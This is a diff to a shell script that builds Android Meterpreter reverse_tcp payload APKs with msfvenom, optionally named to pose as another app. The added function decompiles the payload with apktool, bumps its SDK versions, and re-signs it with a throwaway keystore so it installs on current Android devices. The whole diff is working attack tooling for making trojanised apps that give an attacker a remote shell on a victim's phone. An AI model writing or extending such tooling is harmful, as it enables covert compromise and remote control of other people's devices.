@@ -56,6 +56,44 @@ stop_tunnel() {
     info "LAN mode stopped"
 }
 
+fix_apk_compat() {
+    local apk="$1"
+    local outdir="/tmp/apk_fix_$(date +%s)"
+
+    info "Fixing APK compatibility (api level 15 -> 21)..."
+
+    if ! command -v apktool &>/dev/null; then
+        info "Installing apktool..."
+        sudo apt install -y apktool default-jdk 2>/dev/null
+    fi
+    if ! command -v keytool &>/dev/null; then
+        sudo apt install -y default-jdk 2>/dev/null
+    fi
+
+    apktool d "$apk" -o "$outdir" -f 2>/dev/null || return 1
+
+    sed -i 's|android:minSdkVersion="[0-9]*"|android:minSdkVersion="21"|g' "$outdir/AndroidManifest.xml"
+    if ! grep -q 'android:targetSdkVersion' "$outdir/AndroidManifest.xml" 2>/dev/null; then
+        sed -i 's|<uses-sdk|<uses-sdk android:targetSdkVersion="33"|' "$outdir/AndroidManifest.xml"
+    fi
+
+    apktool b "$outdir" -o /tmp/payload_unsigned.apk 2>/dev/null || return 1
+
+    keytool -genkey -v -keystore /tmp/debug.keystore -alias android \
+        -keyalg RSA -keysize 2048 -validity 10000 \
+        -dname "CN=Android,OU=Debug,O=Android,C=US" \
+        -storepass android -keypass android -noprompt 2>/dev/null
+
+    jarsigner -sigalg SHA1withRSA -digestalg SHA1 \
+        -keystore /tmp/debug.keystore -storepass android -keypass android \
+        /tmp/payload_unsigned.apk android 2>/dev/null
+
+    cp /tmp/payload_unsigned.apk "$apk"
+    rm -rf "$outdir" /tmp/payload_unsigned.apk /tmp/debug.keystore
+    info "APK compatibility fixed"
+    return 0
+}
+
 build_payload() {
     local lhost="$1" lport="$2" template="$3" outname="$4" appname="$5"
     [ -z "$lhost" ] && { err "LHOST required."; return 1; }
@@ -77,7 +115,7 @@ build_payload() {
 
     local cmd="msfvenom $apk_flag -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport"
     [ -n "$appname" ] && cmd+=" AndroidAppName='$appname'"
-    cmd+=" AndroidMkSdk=33 AndroidTargetSdk=33 -o /tmp/payload.apk --platform android --arch dalvik 2>&1"
+    cmd+=" -o /tmp/payload.apk --platform android --arch dalvik 2>&1"
 
     if ! eval "$cmd"; then
         err "msfvenom failed"
@@ -91,6 +129,12 @@ build_payload() {
         return 1
     fi
 
+    fix_apk_compat /tmp/payload.apk || {
+        err "APK compatibility fix failed"
+        return 1
+    }
+
+    size=$(stat -c%s /tmp/payload.apk 2>/dev/null)
     cp /tmp/payload.apk "$outpath"
     ok "Payload: $outpath ($(awk "BEGIN {printf \"%.1f\", $size/1024}") KB)"
     echo "$outpath"
